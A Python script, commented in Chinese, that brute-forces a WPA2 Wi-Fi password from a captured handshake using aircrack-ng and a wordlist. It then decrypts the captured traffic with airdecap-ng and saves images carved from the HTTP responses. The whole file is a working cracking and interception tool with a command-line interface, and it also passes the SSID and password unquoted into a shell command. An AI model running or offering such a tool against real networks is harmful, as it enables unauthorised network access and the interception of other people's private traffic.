import os
import sys
import subprocess
import argparse
import pyshark
from scapy.all import rdpcap, wrpcap
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from hashlib import sha1
import binascii
import re

# 配置参数
OUTPUT_DIR = "./output"     # 保存解密文件的目录

# 创建输出目录
os.makedirs(OUTPUT_DIR, exist_ok=True)

# 0. 暴力破解Wifi密码
def crack_wifi_password(essid, wordlist, pcap_file):
    try:
        # 构建命令
        command = [
            'aircrack-ng',
            '-e', essid,
            '-w', wordlist,
            pcap_file
        ]

        print("[*] 开始暴力破解Wifi密码...")

        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        # 实时监控输出
        key_found = None
        error_message = None
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                # print(output.strip())

                # 检查是否找到密钥
                if "KEY FOUND!" in output:
                    match = re.search(r"KEY FOUND! \[ (.*?) \]", output)
                    if match:
                        key_found = match.group(1)
                elif "Packets contained no EAPOL data; unable to process this AP." in output:
                    error_message = output.strip()

        return key_found, error_message

    except Exception as e:
        print(f"[Error]执行过程中出错: {str(e)}")
        return None


# 1. 提取握手包并验证
def extract_handshake(pcap_file):
    print("[*] 检查 EAPOL 握手包...")
    capture = pyshark.FileCapture(pcap_file, display_filter="eapol")
    handshake_packets = [pkt for pkt in capture]
    if len(handshake_packets) < 4:
        print("[!] 未捕获完整的四次握手，无法解密流量！")
        exit(1)
    print(f"[*] 捕获到 {len(handshake_packets)} 个 EAPOL 数据包")
    return handshake_packets

# 2. 生成 PMK
def generate_pmk(password, ssid):
    print("[*] 生成 PMK...")
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=32,
        salt=ssid.encode(),
        iterations=4096,
    )
    pmk = kdf.derive(password.encode())
    print(f"[*] PMK: {binascii.hexlify(pmk).decode()}")
    return pmk

# 3. 解密 WPA2 流量
def decrypt_wpa2(pcap_file, password, ssid):
    print("[*] 尝试解密 WPA2 流量...")
    pmk = generate_pmk(password, ssid)
    output_file = os.path.join(OUTPUT_DIR, "decrypted.pcap")
    os.system(f"airdecap-ng -e {ssid} -p {password}  {pcap_file} -o {output_file} > /dev/null 2>&1")
    print(f"[*] 解密完成，解密文件保存为: {output_file}")
    return output_file

# 4. 提取 HTTP 数据
def extract_http_data(decrypted_pcap):
    print("[*] 提取 HTTP 流量...")
    capture = pyshark.FileCapture(decrypted_pcap, display_filter="http")
    for packet in capture:
        try:
            if "image" in packet.http.content_type:
                print(f"[+] 发现图片: {packet.http.content_type}")
                file_data = packet.http.file_data
                cleaned_data = re.sub(r'[^0-9a-fA-F]', '', file_data)
                
                if not cleaned_data:
                    print(f"[-] 无有效数据，跳过包 {packet.number}")
                    continue

                file_name = os.path.join(OUTPUT_DIR, f"{packet.number}.jpg")
                with open(file_name, "wb") as f:
                    f.write(binascii.unhexlify(cleaned_data))
                print(f"[+] 图片已保存到: {file_name}")
        except AttributeError:
            continue
    print("[*] HTTP 数据提取完成")

# 主流程
if __name__ == "__main__":
    # 创建参数解析器
    parser = argparse.ArgumentParser(description='破解WiFi密码和抓包数据')
    
    # 添加命令行参数
    parser.add_argument('-s', '--ssid', required=True, help='WiFi的SSID（名称）')
    parser.add_argument('-w', '--wordlist', required=True, help='密码字典文件路径')
    parser.add_argument('-f', '--file', required=True, help='抓包文件（.pcap）路径')
    args = parser.parse_args()

    SSID = args.ssid
    WORD_LIST = args.wordlist
    PCAP_FILE = args.file
    
    print("[*] 开始处理抓包文件...")
    WIFI_PASSWORD, ERROR_MESSAGE= crack_wifi_password(SSID, WORD_LIST, PCAP_FILE)
    if WIFI_PASSWORD:
        print("[*] 破解获取的WIfi密码是:",{WIFI_PASSWORD})
    elif ERROR_MESSAGE:
        print("[ERROR]:", ERROR_MESSAGE)
        print("[ERROR]：破解WiFi密码失败,抓包文件中缺少必要的四次握手数据")
        sys.exit(1)

    handshake_packets = extract_handshake(PCAP_FILE)
    decrypted_pcap = decrypt_wpa2(PCAP_FILE, WIFI_PASSWORD, SSID)
    extract_http_data(decrypted_pcap)
    print("[*] 全部处理完成！")
